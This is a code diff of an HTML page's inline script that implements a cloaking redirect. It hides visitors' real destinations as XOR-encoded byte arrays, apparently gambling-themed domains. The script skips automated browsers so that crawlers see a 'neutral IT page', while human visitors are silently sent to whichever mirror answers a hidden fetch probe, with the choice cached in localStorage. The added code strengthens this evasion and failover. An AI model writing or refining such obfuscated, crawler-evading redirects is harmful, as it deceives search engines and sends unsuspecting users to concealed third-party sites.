@@ -66,25 +66,26 @@
   <script>
   (function(){
     try{
-      // 1) drop obvious automation / non-interactive agents (crawlers stay on the neutral IT page)
-      if (navigator.webdriver) return;
-      if (!navigator.languages || !navigator.languages.length) return;
-      if (typeof document.hidden !== "undefined" && document.hidden) return;
-      // 2) decode destination at runtime (never present as plain text in HTML)
-      var e=[50,46,46,42,41,96,117,117,45,45,45,116,57,50,119,44,51,42,119,54,63,51,41,47,116,57,53,55,117],k=90,u="";
-      for(var i=0;i<e.length;i++){u+=String.fromCharCode(e[i]^k);}
-      // 3) carry through any sub-path/query/hash below the door base (e.g. /m/rf/TOT -> <target>/rf/TOT)
-      var base="/m/";
-      var p=location.pathname||"";
+      if(navigator.webdriver) return;
+      if(!navigator.languages||!navigator.languages.length) return;
+      if(typeof document.hidden!=="undefined"&&document.hidden) return;
+      var k=90, P=[[50,46,46,42,41,96,117,117,45,45,45,116,57,50,119,44,51,42,119,54,63,51,41,47,116,57,53,55,117],[50,46,46,42,41,96,117,117,57,62,52,116,48,53,50,52,52,35,53,48,40,116,57,53,55,117],[50,46,46,42,41,96,117,117,54,59,53,44,63,61,59,41,116,59,42,42,119,45,59,42,119,107,109,98,116,57,53,55,117],[50,46,46,42,41,96,117,117,54,59,53,44,63,61,59,41,116,53,60,60,51,57,51,59,54,119,42,42,41,42,53,40,46,41,116,57,53,55,117]];
+      function dec(a){var s="";for(var i=0;i<a.length;i++){s+=String.fromCharCode(a[i]^k);}return s;}
+      var urls=[];for(var i=0;i<P.length;i++){urls.push(dec(P[i]));}
+      var base="/m/", p=location.pathname||"";
       var extra=(p.indexOf(base)===0)?p.slice(base.length):"";
-      var dest=extra?u.replace(/\/+$/,"")+"/"+extra:u;
-      dest+=(location.search||"")+(location.hash||"");
-      // 4) expose manual fallback (in case auto-nav is blocked in a webview)
-      var c=document.getElementById("c");
-      if(c){c.style.display="inline-block";c.setAttribute("href",dest);}
-      // 5) tiny human-ish delay, then go
-      setTimeout(function(){ try{ location.replace(dest); }catch(_){ location.href=dest; } }, 350);
-    }catch(_){ /* stay on neutral page */ }
+      function full(u){var d=extra?u.replace(/\/+$/,"")+"/"+extra:u;return d+(location.search||"")+(location.hash||"");}
+      var go=false;
+      function nav(u){if(go)return;go=true;var d=full(u);var c=document.getElementById("c");if(c){c.style.display="inline-block";c.setAttribute("href",d);}setTimeout(function(){try{location.replace(d);}catch(_){location.href=d;}},120);}
+      function probe(u,cb){var done=false;var to=setTimeout(function(){if(!done){done=true;cb(false);}},2500);
+        try{fetch(u+"?_="+Math.random(),{mode:"no-cors",cache:"no-store"}).then(function(){if(!done){done=true;clearTimeout(to);cb(true);}},function(){if(!done){done=true;clearTimeout(to);cb(false);}});}
+        catch(_){if(!done){done=true;clearTimeout(to);cb(false);}}}
+      var LS="__d";var cached=null;
+      try{var raw=localStorage.getItem(LS);if(raw){var o=JSON.parse(raw);if(o&&o.u&&(Date.now()-o.t)<216e5&&urls.indexOf(o.u)>=0)cached=o.u;}}catch(_){}
+      function save(u){try{localStorage.setItem(LS,JSON.stringify({u:u,t:Date.now()}));}catch(_){}}
+      function race(){var pending=urls.length;for(var j=0;j<urls.length;j++){(function(u){probe(u,function(ok){if(go)return;if(ok){save(u);nav(u);}else{pending--;if(pending===0){nav(urls[0]);}}});})(urls[j]);}}
+      if(cached){probe(cached,function(ok){if(ok){nav(cached);}else{race();}});}else{race();}
+    }catch(_){}
   })();
   </script>
 </body>
